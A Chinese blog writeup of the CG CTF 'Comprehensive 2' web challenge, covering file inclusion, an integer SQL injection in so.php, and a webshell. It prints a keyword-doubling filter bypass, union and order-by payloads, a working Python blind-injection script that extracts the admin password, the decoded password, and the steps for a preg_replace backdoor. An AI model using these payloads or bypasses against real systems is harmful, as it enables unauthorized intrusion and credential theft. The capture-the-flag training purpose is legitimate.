---
title: "CG CTF Web 综合2 Writeup"
date: 2022-07-20T16:08:22+08:00
draft: false
author: "X1r0z"

tags: ['php','ctf','sqli']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


题目很综合, 出的很好

看到答案后觉得当初如果往社工方面想的话, 会更简单...

<!--more-->

http://cms.nuptzj.cn/

![20220720161011](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720161011.png)

留言板

常规性的右键查看源代码

![20220720161031](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720161031.png)

一看就知道是文件包含

![20220720161056](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720161056.png)

根据 sm.txt 以及直接访问网站得到的相关信息, 下载了网站的 PHP 源码, 但 config.php 无法读取

![20220720161214](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720161214.png)

about.php

![20220720161238](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720161238.png)

有一个过滤, 提示是敏感目录, 有一个 `loginxlcteam` 关键词

直接访问试试

![20220720161326](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720161326.png)

后台登陆, 但源码肯定读不出来

很容易就可以猜出来管理员账户是 admin

但密码尝试了好几位都是长度不一致

![20220720161430](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720161430.png)

可能有点 bug

可以尝试爆破, 但这个先放一边, 我们接着看源码

tips 说了 xss 与题目无关, 所以我们看一下 antiinject.php

```php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
function antiinject($content){
$keyword=array("select","union","and","from",' ',"'",";",'"',"char","or","count","master","name","pass","admin","+","-","order","=");
$info=strtolower($content);
for($i=0;$i<=count($keyword);$i++){
 $info=str_replace($keyword[$i], '',$info);
}
return $info;
}
?>
```

这里把关键字都过滤了, 而且过滤了 `' " + - =` 这些单个的字符和空格

可以看出来, 这里的"过滤"仅仅是过滤一次, 对于 `select` `union` 这种关键词可以以 `selselectect` `ununionion` 的形式进行绕过, 对于空格我们可以用 mysql 的行间注释 `/**/` 但对于单字符来说无法绕过

也就是说我们的注入语句中不可能出现 `' " =`

另外发现了 passencode.php

```php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
function passencode($content){
//$pass=urlencode($content);
$array=str_split($content);
$pass="";
for($i=0;$i<count($array);$i++){
if($pass!=""){
$pass=$pass." ".(string)ord($array[$i]);
}else{
$pass=(string)ord($array[$i]);
}
}
return $pass;
}
?>
```

就是用 ASCII + 空格的形式编码管理员密码, 这个后面会用到, 现在先放一边

查看了好几个 SQL 操作的点, 基本都是下面这种

![20220720162010](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720162010.png)

首先这种都是字符型的, 而且使用了 `mysql_real_escape_string()` 进行转义

也就是说在没有数据库启用宽字节 (如 gbk) 的情况下, 我们根本没有办法进行注入

但是 `mysql_real_escape_string()` 的转义对于整数型的注入是没有用的, 因为 `?id=123` 这种形式的注入根本就不需要闭合引号

所以我们现在的目标就很明确了: 找到一个整数型的注入点

经过仔细查找后, 在 so.php 有一处注入点

![20220720162323](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720162323.png)

这里对 `User-Agent` 进行了验证, burp 直接改就行

![20220720162539](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720162539.png)

下面就是正常的手工注入流程

我第一次用的是盲注, 甚至还写了个小脚本....(有点绕弯子)

后来发现 union 其实也可以, 不过需要先让前面的内容报错 (因为正常的内容占位了, 会导致 union 后面的内容无法显示出来)

```
soid=1/**/ooorrderrder/**/by/**/4 // true
soid=1/**/ooorrderrder/**/by/**/5 // false
```

order by 绕过有个小技巧, 就是构造 `ooorrderrder`, 因为 `order` 含有 `or`, 会过滤两次, 在 `o` 和 `r` 的中间再插入一次 `or` 就能绕过去了

或者直接 union select 挨个挨个试

![20220720162946](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720162946.png)

顺便贴一下当时盲注写的脚本

```python
#-*-coding:utf-8-*-

import requests
import binascii

def str_to_hexStr(string):
    str_bin = string.encode('utf-8')
    return binascii.hexlify(str_bin).decode('utf-8')


heads = {'User-Agent':'Xlcteam Browser'}

url = 'http://cms.nuptzj.cn/so.php'

dicts = '0123456789 qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_{}!@#$%^&*()+=-?'

password=''

for i in range(1,35):
    for p in dicts:
        pp = str_to_hexStr(p)
        ppp = '0x'+pp
        payloads = '1/**/aandnd/**/if(mid((selselectect/**/userppassass/**/frfromom/**/adadminmin/**/where/**/usernnameame/**/like/**/0x61646d696e),'+str(i)+',1)/**/like/**/'+ppp+',1,0)'
        datas = {'soid':payloads}
        res = requests.post(url,data=datas,headers=heads)
        if res.text.find('0xfxxker')!=-1:
            password += p
            print(password)
            break
```

其实前面已经知道了是 ASCII + 空格的编码形式, dicts 不用写的那么多, `1234567890 ` 就够用了

![20220720163757](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720163757.png)

数据表结构前面的 sm.txt 已经给出来了

![20220720163028](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720163028.png)

密文是 `102 117 99 107 114 117 110 116 117`

根据前面的 passencode.php 可以知道是 ASCII 编码, 解码得到 `fuckruntu`


登录

![20220720163124](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720163124.png)

一句话木马在根目录 `xlcteam.php`

先用文件包含读一下内容

![20220720163228](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720163228.png)

回调函数

看到 `|.*|e` 想到了正则表达式, 网上搜了一下发现 PHP 可以通过 `preg_replace()` 来执行命令

`array_walk()` 的作用就不说了

`http://cms.nuptzj.cn/xlcteam.php?www=preg_replace`

菜刀连接, 密码 wtf (好像现在 webshell 管理工具已经换了....)

![20220720163522](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220720163522.png)